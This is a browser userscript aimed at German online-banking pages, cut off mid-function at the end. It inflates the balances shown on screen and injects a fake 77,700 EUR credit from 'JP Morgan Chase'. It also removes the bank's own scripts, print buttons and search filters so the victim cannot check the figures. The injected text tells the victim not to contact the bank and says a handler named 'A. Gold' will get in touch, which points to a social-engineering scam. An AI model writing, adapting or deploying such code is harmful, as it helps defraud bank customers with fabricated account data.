// ==UserScript==
// @name         Ed Start 4Rec Spelashger2@gmail.com
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/524650/Ed%20Start%204Rec%20Spelashger2%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/524650/Ed%20Start%204Rec%20Spelashger2%40gmailcom.meta.js
// ==/UserScript==






//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    //SCRIPTV2 TRIGGER!



    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: JP Morgan Chase";
    var absenderTitel = "Treuhand: JP Morgan Chase";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen damit nicht gesperrt. A. Graf meldet sich.";
    var amount = 10;
    var vorgemerkt = "no";
    var xamount = 0;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "70";
    var buchungTextsZahl = "437.680";
    var accountsecurity = "4324 270 0508 59";

    if (easyUpdate == "yes"){
        x2amount = 10000;}

    var umsatze = "11490787216";
    var finanz = "11490787029";


    //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// NOW STARTING FROM 0, NOT 1
            var main = 1;
            var subtotal = 2;
            var total = 4;


   // Define your transaction details manually here
    const transactions = [
        // NUMERATION STARTING WITH THE END
 //       {
 //           predecimalAmount: '47',
//            decimalAmount: ',33',
//            transactionTitle: 'Your Transaction Title 1',
//            transactionInfo: "Transaction 1 details",
//            isNegative: false // Example flag, modify this based on your actual logic
//        },
        {
            predecimalAmount: '77.700',
            decimalAmount: ',00',
            transactionTitle: 'JP Morgan Chase',
            transactionInfo: " Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen damit nicht gesperrt. A. Gold meldet sich.",
            isNegative: false // Example flag, modify this based on your actual logic
        },
 // {
//            predecimalAmount: '15.000',
//            decimalAmount: ',00',
////            transactionTitle: 'Andreas Gold',
////            transactionInfo: "Geld von A. Gold.",
//            isNegative: false // Example flag, modify this based on your actual logic
//       },  {
 //           predecimalAmount: '3.000',
//            decimalAmount: ',00',
 //           transactionTitle: 'Andreas Gold.',
 //           transactionInfo: "Ohne A. Gold Geld nicht ausgeben.",
 //           isNegative: false // Example flag, modify this based on your actual logic
 //       },
//  {
//            predecimalAmount: '12.000',
 //           decimalAmount: ',50',
//            transactionTitle: 'JP Morgan Chase',
 //           transactionInfo: "Ohne A. Gold Geld nicht ausgeben. Mit Bank nicht besprechen damit nicht gesperrt. A. Gold meldet sich.",
 //           isNegative: false // Example flag, modify this based on your actual logic
 //       },
        // Add more transactions as needed
    ];

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================

     if (window.location.href.indexOf("onlinebanking") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("11317605933") > 0) {

//  GENERAL UTILITY

// Function to remove elements with class "mkp-identifier-account-link"
function removeElementsWithClass(className) {
    console.log("Removing elements with class:", className);
    document.querySelectorAll('.' + className).forEach(function(element) {
        element.remove();
        console.log("Element removed.");
    });
}

// Function to remove scripts from the document
function removeScriptsFromDocument() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Polling function to remove elements with class "mkp-identifier-account-link" every 10 milliseconds
function pollToRemoveElements() {
    setInterval(function() {
        removeElementsWithClass("mkp-identifier-account-link");
    }, 100);
}

// Remove all scripts from the document
removeScriptsFromDocument();

// Start polling to remove elements with class "mkp-identifier-account-link"
pollToRemoveElements();
    }


//  GENERAL UTILITY
//======================================================================================================================================

     if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {


    // Function to periodically check for the presence of elements with class "mkp-card-link"
    function checkForCardLinkAndUpdateBalances() {
        var cardLinks = document.querySelectorAll('.mkp-card-link');

        // Check each element with class "mkp-card-link"
        cardLinks.forEach(function(cardLink) {
            // Modify balances if the element is found
            console.log('Element with class "mkp-card-link" found. Modifying balances...');

            // Example of modifying balances - replace with your logic
            // Update the main balance and its sibling
            var mainBalanceIndex = main || 0;
            var mainBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[mainBalanceIndex]?.firstElementChild;
            if (mainBalanceElement) {
                updateBalanceAndSiblingClass(mainBalanceElement, xamount);
            }

            // Update the total balance and its sibling
            var totalBalanceIndex = total || 1;
            var totalBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[totalBalanceIndex]?.firstElementChild;
            if (totalBalanceElement) {
                updateBalanceAndSiblingClass(totalBalanceElement, x2amount + xamount);
            }

            // Update the subtotal balance and its sibling
            var subtotalBalanceIndex = subtotal || 1;
            var subtotalBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[subtotalBalanceIndex]?.firstElementChild;
            if (subtotalBalanceElement) {
                updateBalanceAndSiblingClass(subtotalBalanceElement, x2amount + xamount);
            }

            // Remove the mkp-card-link element 5 milliseconds after modification
            setTimeout(() => {
                cardLink.remove();
                console.log("Element with class 'mkp-card-link' removed.");
            }, 10);
        });
    }

    // Check for elements with class "mkp-card-link" every 5 seconds
    setInterval(checkForCardLinkAndUpdateBalances, 90);

    // Function to update balance and handle class change for both the main balance element and its sibling
    function updateBalanceAndSiblingClass(balanceElement, amount) {
        // Get the sibling element
        var siblingElement = balanceElement.nextElementSibling;

        // Get the current balance text
        var balanceText = balanceElement.textContent;

        // Extract the numeric value from the text
        var currentBalance = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

        // Check if the balance was originally negative
        var wasNegative = balanceText.includes('-');

        // Adjust the sign of the amount based on the original balance
        var adjustedAmount = wasNegative ? -amount : amount;

        // Update the balance
        var newBalance = currentBalance + adjustedAmount;

        // Determine the new class based on the sign of the balance
        var newClass = newBalance < 0 ? 'minus' : 'plus';

        // Update the balance text content with commas
        balanceElement.textContent = numberWithCommas(Math.abs(newBalance)); // Ensure positive value for text content

        // Update the class for the balance element
        balanceElement.classList.remove('minus', 'plus');
        balanceElement.classList.add(newClass);

        // Update the class for the sibling element
        siblingElement.classList.remove('minus', 'plus');
        siblingElement.classList.add(newClass);

        // Change class of balance-decimal if the balance became positive after the modification
        if (!wasNegative && newBalance >= 0) {
            balanceElement.nextElementSibling.classList.remove('minus');
            balanceElement.nextElementSibling.classList.add('plus');
        }
    }

    // Function to format numbers with commas
    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }

}


  if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================

        //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

    /// Refresh the finanzstatus page once it loads for the first time

 var refresh = window.localStorage.getItem('refresh');
 console.log(refresh);
 setTimeout(function() {
 if (refresh===null){
 window.location.reload();
   window.localStorage.setItem('refresh', "1");
 }
 }, 40); // 1500 milliseconds = 1.5 seconds

 setTimeout(function() {
 localStorage.removeItem('refresh')
  }, 15); // 1700 milliseconds = 1.7 seconds

          //                        var KontosBoxElement = document.getElementsByClassName("nbf-container-box nbf-container--pfm expandable")[0];
//if (KontosBoxElement) {
 //   KontosBoxElement.remove();
//}


//==========================================================================================================================================================================================================




// Function to remove elements with the class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", elements containing the text "Druckansicht", and elements with class "mkp-expandable-button", and show a spinner when specific text is found
function removePrimaryCTAAndShowSpinner() {
    // Remove elements with the class "primary-cta"


    // Remove elements with the class "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned"
    var elementsToRemoveButtonGroup = document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned');
    elementsToRemoveButtonGroup.forEach(function(element) {
        element.remove();
    });

    // Remove elements containing the text "Druckansicht"
    var elementsToRemoveDruckansicht = document.evaluate("//*[contains(text(),'Druckansicht')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
    for (var i = 0; i < elementsToRemoveDruckansicht.snapshotLength; i++) {
        var element = elementsToRemoveDruckansicht.snapshotItem(i);
        element.remove();
    }

 // Function to remove element with id "pfmWidgetId"
function removePfmWidgetIdElement() {
    var pfmWidgetElement = document.getElementById('pfmWidgetId');
    if (pfmWidgetElement) {
        pfmWidgetElement.remove();
        console.log('Removed element with id "pfmWidgetId"');
    }
}

// Regular check every 100 milliseconds to remove the element
setInterval(removePfmWidgetIdElement, 100);

// Mutation observer to remove "pfmWidgetId" element whenever it's added to the DOM
var pfmWidgetObserver = new MutationObserver(function(mutationsList) {
    for(var mutation of mutationsList) {
        if (mutation.type === 'childList') {
            for(var node of mutation.addedNodes) {
                if (node.nodeType === Node.ELEMENT_NODE && node.id === 'pfmWidgetId') {
                    node.remove();
                    console.log('Removed element with id "pfmWidgetId" (mutation observer)');
                }
            }
        }
    }
});

// Start observing the document
pfmWidgetObserver.observe(document.body, { childList: true, subtree: true });







    console.log('Removed elements with class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", "Druckansicht", and "mkp-expandable-button", and showed spinner');
}


function showSpinner() {
    // Show spinner using custom element or other implementation
    var spinner = document.createElement('div');
    spinner.style.position = 'fixed';
    spinner.style.top = '0';
    spinner.style.left = '0';
    spinner.style.width = '100%';
    spinner.style.height = '100%';
    spinner.style.background = 'rgba(255, 255, 255, 0.9)'; // Adjust alpha value here
    spinner.style.zIndex = '9999';
    spinner.innerHTML = '<div style="width: 100px; height: 100px; background: url(https://upload.wikimedia.org/wikipedia/commons/4/4e/Logo-_Sparkassen-App_%E2%80%93_die_mobile_Filiale.png) center center no-repeat; background-size: contain;"></div>';
    document.body.appendChild(spinner);
}

// Call the function immediately
removePrimaryCTAAndShowSpinner();

//-----------------------------------------------------------------------------------------------------------------------------------
//-----------------------------------------------------------------------------------------------------------------------------------




        }

    }



  if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {


// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Function to check and rename elements with class "mkp-expandable is-hidden" to "mkp-expandable is-visible"
function updateExpandableElements() {
    console.log("Checking and updating expandable elements...");

    // Select all elements with class "mkp-expandable is-hidden"
    var hiddenExpandables = document.querySelectorAll('.mkp-expandable.is-hidden');

    // Loop through each hidden expandable element and update its class
    hiddenExpandables.forEach(function(element) {
        element.classList.remove('is-hidden'); // Remove the "is-hidden" class
        element.classList.add('is-visible');  // Add the "is-visible" class
        console.log('Element class updated:', element);
    });
}

// Watch for changes in the DOM and update expandable elements
var observer = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.classList && node.classList.contains('mkp-expandable') && node.classList.contains('is-hidden')) {
                    console.log("Found added hidden expandable element. Updating...");
                    node.classList.remove('is-hidden'); // Remove the "is-hidden" class
                    node.classList.add('is-visible');  // Add the "is-visible" class
                    console.log("Element updated.");
                }
            }
        }
    }
});

// Start observing the document for changes
observer.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Check and update expandable elements every 50 milliseconds
setInterval(updateExpandableElements, 50);

         }


if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf(finanz) > 0) {

    // Function to remove scripts from the document
    function removeAllScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with the specified class
    function removeButtonGroups() {
        console.log("Removing button groups...");
        document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned').forEach(function(buttonGroup) {
            buttonGroup.remove();
            console.log("Button group removed.");
        });
    }

    // Watch for changes in the DOM and update expandable elements and remove button groups
    var domObserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    // Update expandable elements
                    if (node.classList && node.classList.contains('mkp-expandable') && node.classList.contains('is-hidden')) {
                        console.log("Found added hidden expandable element. Updating...");
                        node.classList.remove('is-hidden'); // Remove the "is-hidden" class
                        node.classList.add('is-visible');  // Add the "is-visible" class
                        console.log("Element updated.");
                    }

                    // Remove button groups
                    if (node.classList && node.classList.contains('mkp-button-group') &&
                        node.classList.contains('mkp-layout-margin') &&
                        node.classList.contains('mkp-button-group-with-separator') &&
                        node.classList.contains('mkp-button-group-mobile-left-aligned')) {
                        console.log("Found added button group. Removing...");
                        node.remove();
                        console.log("Button group removed.");
                    }
                }
            }
        }
    });

    // Start observing the document for changes
    domObserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeAllScripts();

    // Remove all button groups initially
    removeButtonGroups();

    // Set interval to repeatedly remove button groups
    setInterval(removeButtonGroups, 100);
}



//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf(umsatze) > 0 ) {



var modificationValue = xamount;

// Function to repeatedly check the condition for balance modification
function dynamicCheckAndModifyBalance() {
    // Set the interval for checking the condition (in milliseconds)
    var interval = 5; // 1 second

    // Function to check and modify the balance
    function checkAndModifyBalance() {
        if (document.getElementsByClassName("mkp-identifier-description")[0]?.children[1]?.children[0]?.textContent === accountsecurity) {
            if (vorgemerkt === "no") {
                modifyMainBalance();
            }
        }
    }

    // Call the function initially
    checkAndModifyBalance();

    // Set interval to repeatedly check the condition
    setInterval(checkAndModifyBalance, interval);
}

// Function to modify the main balance
function modifyMainBalance() {
    // Get the element with class "balance-decimal"
    var balanceElement = document.querySelector('.balance-decimal');

    // Check if the element exists and if it has been modified already
    if (balanceElement && balanceElement.getAttribute('data-modified') !== 'true') {
        // Get the text content of the balance element
        var balanceText = balanceElement.textContent.trim();

        // Extract the numeric value from the text content
        var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

        // Determine the sign of the balance
        var isNegative = balanceText.includes('-');

        // Modify the balance based on the sign and the modification value
        if (isNegative) {
            numericValue -= modificationValue;
        } else {
            numericValue += modificationValue;
        }

        // Update the text content with the modified value and "EUR" currency
        var updatedBalanceText = (isNegative ? '-' : '') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

        // Update the balance text content and class
        balanceElement.textContent = updatedBalanceText;
        balanceElement.className = 'balance-decimal plus';
        balanceElement.setAttribute('data-modified', 'true');

        // Remove minus sign immediately
        var plusBalanceElement = document.querySelector('.balance-decimal.plus');
        if (plusBalanceElement) {
            var updatedBalanceText = plusBalanceElement.textContent.replace(/-/g, '');
            plusBalanceElement.textContent = updatedBalanceText;
        }
    } else {
        console.error('Balance element not found or already modified.');
    }
}

// Call the function to perform dynamic check and modification of the balance
dynamicCheckAndModifyBalance();
 }

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

        //---------------------------------------------------------------------------------------------


// TO WRAP

if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf(umsatze) > 0 ) {

    'use strict';



    // Function to check if account security text is present
    function isAccountSecurityTextPresent() {
        const accountSecurityElement = document.querySelector('.mkp-identifier-description strong');
        if (accountSecurityElement && accountSecurityElement.textContent.trim() === accountsecurity.trim()) {
            return true; // Account security text found and matches
        }
        return false; // Account security text not found or does not match
    }

    // Function to perform additional check before inserting transactions
    function performAdditionalCheckAndInsert() {
        // Check if account security condition is met
        if (isAccountSecurityTextPresent()) {
            // Perform insertion of transactions
            insertTransactionsInterval();
        } else {
            console.log('Account security check failed, transactions not inserted.');
            // Retry after a delay
            setTimeout(performAdditionalCheckAndInsert, 500); // Retry after 2 seconds
        }
    }

///    // Define your transaction details manually here
//    const transactions = [
//        // NUMERATION STARTING WITH THE END
//        {
//            predecimalAmount: '47',
 //           decimalAmount: ',33',
//            transactionTitle: 'Your Transaction Title 1',
//            transactionInfo: "Transaction 1 details",
//            isNegative: false // Example flag, modify this based on your actual logic
//        },
 //       {
//            predecimalAmount: '100',
 //           decimalAmount: ',50',
//            transactionTitle: 'Your Transaction Title 2',
//            transactionInfo: "Transaction 2 details",
 //           isNegative: true // Example flag, modify this based on your actual logic
//        },
 //       // Add more transactions as needed
 //   ];

    // Function to check if transaction is already inserted
    function isTransactionInserted(transactionTitle) {
        const transactions = document.querySelectorAll('.mkp-card-list > li');
        for (const transaction of transactions) {
            const titleElement = transaction.querySelector('.mkp-identifier-link');
            if (titleElement && titleElement.textContent.trim() === transactionTitle.trim()) {
                return true; // Transaction already inserted
            }
        }
        return false; // Transaction not found
    }

    // Function to insert a single transaction
    function insertTransaction(transaction) {
        // Check if transaction is already inserted
        if (isTransactionInserted(transaction.transactionTitle)) {
            console.log(`Transaction "${transaction.transactionTitle}" already inserted, skipping...`);
            return;
        }

        // Find the target element to insert the transaction
        const targetElement = document.querySelector('.mkp-card-list');

        if (targetElement) {
            // Create a new list item element
            const listItem = document.createElement('li');

            // Determine classes for predecimal and decimal based on transaction sign
            const predecimalClass = transaction.isNegative ? 'minus' : 'plus';
            const decimalClass = transaction.isNegative ? 'minus' : 'plus';

            // Construct the inner HTML for the transaction item
            listItem.innerHTML = `
                <div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable">
                    <div class="mkp-identifier">
                        <div class="mkp-identifier-description">
                            <h4 class="mkp-headline-05">
                                <a href="#" class="mkp-identifier-link" aria-label="Umsatz: ${transaction.transactionTitle}; Betrag: ${transaction.predecimalAmount},${transaction.decimalAmount} EUR">
                                    ${transaction.transactionTitle}
                                </a>
                            </h4>
                            <p>
                                ${transaction.transactionInfo}
                            </p>
                        </div>
                        <div class="mkp-identifier-sticker mkp-identifier-sticker-placeholder" aria-hidden="true"></div> <!-- Added this line -->
                        <div class="mkp-identifier-currency">
                            <p class="mkp-currency mkp-currency-pill mkp-currency-m">
                                <span aria-hidden="true" class="balance-predecimal ${predecimalClass}">${transaction.predecimalAmount}</span>
                                <span aria-hidden="true" class="balance-decimal ${decimalClass}">${transaction.decimalAmount}&nbsp;EUR</span>
                                <span aria-hidden="false" class="offscreen">${transaction.predecimalAmount},${transaction.decimalAmount} EUR</span>
                            </p>
                        </div>
                    </div>
                </div>
            `;

            // Insert the new list item as the first child of mkp-card-list
            targetElement.insertBefore(listItem, targetElement.firstChild);
        } else {
            console.error('Target element .mkp-card-list not found!');
        }
    }

    // Function to insert transactions every 2 seconds
    function insertTransactionsInterval() {
        // Attempt to insert each transaction
        transactions.forEach(transaction => {
            insertTransaction(transaction);
        });

        // Retry insertion if it failed
        setTimeout(insertTransactionsInterval, 200);
    }

    // Start performing additional check initially
    performAdditionalCheckAndInsert();

}







if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf(umsatze) > 0 ) {

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Function to remove elements with specific classes
function removeTargetElements() {
    const classesToRemove = [
        '.bline.nbf-umsatzdrucken.mkp-layout-padding.btext-only',
        '.sort-button-bottom.mkp-row.mkp-justify-content-flex-end',
        '.bline.nbf-umsatzsuchefilter',
        '.mkp-button-flyout.has-valuelist-multiselect',
        '.umsatz-sayt',
        '.mkp-button-flyout.has-button-slot'
    ];

    classesToRemove.forEach(selector => {
        document.querySelectorAll(selector).forEach(function(element) {
            element.remove();
            console.log(`Element with class "${selector}" removed.`);
        });
    });
}

// MutationObserver for hidden expandable elements and target elements
var rtyobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.classList) {
                    if (node.classList.contains('mkp-expandable') && node.classList.contains('is-hidden')) {
                        console.log("Found added hidden expandable element. Updating...");
                      node.classList.add('is-visible');  // Add the "is-visible" class
                        console.log("Element updated.");
                    }

                    // Check and remove target elements
                    if (
                        node.classList.contains('bline') && node.classList.contains('nbf-umsatzdrucken') && node.classList.contains('mkp-layout-padding') && node.classList.contains('btext-only') ||
                        node.classList.contains('sort-button-bottom') && node.classList.contains('mkp-row') && node.classList.contains('mkp-justify-content-flex-end') ||
                        node.classList.contains('bline') && node.classList.contains('nbf-umsatzsuchefilter') ||
                        node.classList.contains('mkp-button-flyout') && node.classList.contains('has-valuelist-multiselect') ||
                        node.classList.contains('umsatz-sayt') ||
                        node.classList.contains('mkp-button-flyout') && node.classList.contains('has-button-slot')
                    ) {
                        node.remove();
                        console.log("Target element removed.");
                    }
                }
            }
        }
    }
});

// Start observing the document for changes
rtyobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Initial removal of target elements
removeTargetElements();

// Set interval to repeatedly check and remove target elements
setInterval(removeTargetElements, 50); // Adjust the interval as needed
}









//==========================================================================================================================================================================================================
if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("11317605933") > 0) {

    'use strict';

    // Function to remove elements with class "mkp-identifier-currency"
    function removeIdentifierCurrencyElements() {
        var triggerTexts = [
            "Von welchem Konto möchten Sie überweisen?",
            "Für welches Konto möchten Sie Umsätze aufrufen?"
        ];

        triggerTexts.forEach(function(triggerText) {
            if (document.body.textContent.includes(triggerText)) {
                var elementsToRemove = document.querySelectorAll('.mkp-identifier-currency');
                elementsToRemove.forEach(function(element) {
                    element.remove();
                    console.log('Removed element with class "mkp-identifier-currency".');
                });
            }
        });
    }



    // Set interval to run the removal functions every 50 milliseconds
    setInterval(function() {
        removeIdentifierCurrencyElements();

    }, 50);
}


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("uebertrag") > 0 || window.location.href.indexOf("10733487459") > 0 ) {
    'use strict';

    // Function to remove elements with specific classes
    function removeElementsWithClass(className) {
        console.log("Removing elements with class:", className);
        document.querySelectorAll('.' + className).forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove script elements
    function removeScriptElements() {
        document.querySelectorAll('script').forEach(function(element) {
            console.log("Script element found. Removing...");
            element.remove();
            console.log("Script element removed.");
        });
    }

    // Set an interval to continuously remove elements and scripts every 50 milliseconds
    setInterval(function() {
        removeElementsWithClass('mkp-identifier-currency');
        removeElementsWithClass('mkp-identifier-account-link');
        removeElementsWithClass('voraussichtlicherSaldo');
        removeScriptElements();
    }, 50);
}






//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

 if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("11280968645") > 0 ) {
    // Configurable values


    var desiredIBAN = accountsecurity; // Your desired IBAN in '     '
    var useSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
    var adjustmentAmount = xamount; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var interval = 200; // Interval in milliseconds to check the condition

    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 3000.50 },
        { index: 1, adjustmentAmount: 3000.70 },
        { index: 2, adjustmentAmount: 3000.90 },
        { index: 3, adjustmentAmount: 3000.10 }
    ];

    // Function to remove elements containing the text "Druckansicht"
    function removeDruckansichtElements() {
        var elementsToRemoveDruckansicht = document.evaluate("//*[contains(text(),'Druckansicht')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
        for (var i = 0; i < elementsToRemoveDruckansicht.snapshotLength; i++) {
            var element = elementsToRemoveDruckansicht.snapshotItem(i);
            element.remove();
        }
    }

    // Function to check and modify the balance
    function checkAndModifyBalance() {
